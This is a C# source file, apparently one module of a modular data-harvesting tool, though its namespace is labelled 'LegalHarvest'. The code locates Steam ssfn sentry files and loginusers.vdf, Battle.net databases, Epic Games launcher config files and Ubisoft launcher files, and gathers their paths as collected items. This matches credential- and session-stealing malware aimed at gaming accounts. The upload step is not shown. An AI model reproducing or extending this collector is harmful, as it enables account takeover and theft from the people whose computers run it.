using System;
using System.Collections.Generic;
using System.IO;

namespace LegalHarvest.Modules
{
    public class GamingClientsModule : ICollectorModule
    {
        public string ModuleName => "GamingClients";
        public bool CanExecute() => true;

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();

            // Steam
            string steamPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Steam");
            if (Directory.Exists(steamPath))
            {
                foreach (string file in Directory.GetFiles(steamPath, "ssfn*"))
                    items.Add(new CollectedItem { Category = "SteamSSFN", Name = Path.GetFileName(file), Value = file, Timestamp = DateTime.Now });
                foreach (string dir in Directory.GetDirectories(steamPath, "config"))
                {
                    string loginUsers = Path.Combine(dir, "loginusers.vdf");
                    if (File.Exists(loginUsers))
                        items.Add(new CollectedItem { Category = "Steam", Name = "LoginUsers", Value = loginUsers, Timestamp = DateTime.Now });
                }
            }

            // Battle.net
            string battlenet = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Battle.net");
            if (Directory.Exists(battlenet))
                foreach (string file in Directory.GetFiles(battlenet, "*.db", SearchOption.AllDirectories))
                    items.Add(new CollectedItem { Category = "Battle.net", Name = file, Value = file, Timestamp = DateTime.Now });

            // Epic Games
            string epic = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "EpicGamesLauncher", "Saved", "Config", "Windows");
            if (Directory.Exists(epic))
                foreach (string file in Directory.GetFiles(epic, "*.ini"))
                    items.Add(new CollectedItem { Category = "EpicGames", Name = file, Value = file, Timestamp = DateTime.Now });

            // Ubisoft
            string uplay = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Ubisoft Game Launcher");
            if (Directory.Exists(uplay))
                foreach (string file in Directory.GetFiles(uplay, "*.yml", SearchOption.AllDirectories))
                    items.Add(new CollectedItem { Category = "Ubisoft", Name = file, Value = file, Timestamp = DateTime.Now });

            return items;
        }
    }
}
